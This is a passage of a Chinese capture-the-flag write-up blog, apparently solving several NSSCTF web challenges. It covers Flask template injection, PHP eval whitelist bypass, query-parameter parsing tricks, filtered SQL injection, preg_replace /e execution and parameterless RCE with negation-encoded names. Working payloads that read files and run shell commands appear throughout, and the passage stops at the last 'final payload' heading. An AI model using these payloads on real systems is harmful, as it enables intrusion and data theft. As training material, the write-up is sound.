<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287]&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287].__init__.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;+&quot;pen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>下一步就是cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287].__init__.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;+&quot;pen(&#x27;cat /Th1s_is__F1114g&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png" class>

<h2 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h2><p>先看题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们只能使用白名单里的函数，接下来对我们要用到的函数做一个简单的解释：</p>
<p><strong>base_convert()函数</strong></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p><strong>hex2bin() 函数</strong></p>
<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<p><strong>dechex() 函数</strong></p>
<p>dechex() 函数把十进制数转换为十六进制数。</p>
<p>我们的目标命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;cat /flag&quot;)</span><br></pre></td></tr></table></figure>

<p>但是显然我们需要绕过白名单和黑名单，就不能出现引号和system函数，引号其实可以省略，没有引号命令也能执行，这里我们采用的方法是用变量保存函数和参数，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>我们使用白名单里的函数进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>

<p>但是问题又来了，_GET不是白名单里的变量名，[]也被黑名单过滤</p>
<ol>
<li>[]可以用{}来代替</li>
<li>_GET就要用到上面的hex2bin() 函数转化</li>
</ol>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>_GET&#x3D;hex2bin(5f 47 45 54)</p>
<p>但是hex2bin也不是白名单里的函数，这里就用到白名单里的base_convert函数，用base_convert()函数将10进制数转化为36进制的hex2bin</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>hex2bin&#x3D;base_convert(37907361743,10,36)</p>
<p>5f 47 45 54也不能直接填，因为会被preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs); 这句话当作函数名放进白名单里检测，所以5f 47 45 54也需要经过进制转化<br>dechex() 函数把十进制数转换为十六进制数。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>5f474554<code>=</code>dechex(1598506324)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure>

<p>将get存进一个变量里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure>

<p>最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>题目一进去是空白的，f12没什么反应，我们尝试访问index.php。也失败了，这里就尝试用伪协议来读取index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>得到后端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试传参发现没有反应，这里涉及到了php解析变量的一个特性，在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。但是用一个特性是可以绕过的，就是当 [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。</p>
<p>也就是说如果不使用[的话，N_S.S就会被解析为N_S_S，所以正确的变量传参就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?N[S.S=phpinfo();</span><br></pre></td></tr></table></figure>

<p>![](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;web学习笔记&#x2F;题集&#x2F;暑假题目&#x2F;暑假题目.assets&#x2F;[NSSRound%238 Basic]MyDoor解题截图.png)</p>
<p>直接ctrl+F找到flag的值</p>
<h2 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>相对安全的方式，就是POST方式了，并且告诉了我们参数是nss，尝试传参</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>很明显是假的flag</p>
<p>经判断，闭合方式为’，过滤了union，空格，information</p>
<p>我们开始爆库名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>爆表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>直接爆字段（一开始猜测flag在flll444g里面，但是很快发现不对）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功拿到flag。</p>
<h2 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一步很简单，对于text变量，我们使用data协议直接写入一个新文件，而file变量直接利用伪协议进行读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://ta/a,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>得到题目next.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到php的正则逆向引用与子模式分析</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miketwais/p/php_preg.html">php正则逆向引用与子模式分析 - MasonZhang - 博客园 (cnblogs.com)</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>ctrl+F找到flag：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>明显是无参RCE，</p>
<p>发现可以使用取反绕过：</p>
<p>这里说说无参RCE的常用函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、getallheaders()</span><br><span class="line">2、get_defined_vars()</span><br><span class="line">3、session_id()</span><br><span class="line"></span><br><span class="line">配套</span><br><span class="line">implode() 将一维数组转化为字符串</span><br><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end() 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回。</span><br><span class="line">array_reverse() 函数返回翻转顺序的数组。</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin() — 转换十六进制字符串为二进制字符串。</span><br><span class="line">getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br></pre></td></tr></table></figure>

<p>然后就掏出我们的祖传脚本，目标命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(current(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>为什么是这个呢，这个命令就是取所有的请求头存为数组，并取第一个的值进行命令执行，所以我们就需要在请求包的第一行添加一个值为我们想要执行的命令的请求头。</p>
<p>分别用脚本跑出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system:(~%8C%86%8C%8B%9A%92)</span><br><span class="line">current:(~%9C%8A%8D%8D%9A%91%8B)</span><br><span class="line">getallheaders:(~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)</span><br></pre></td></tr></table></figure>

<p>将他们拼接起来即可，还有就是要用[!%FF]分开</p>
<p>最终payload为：</p>
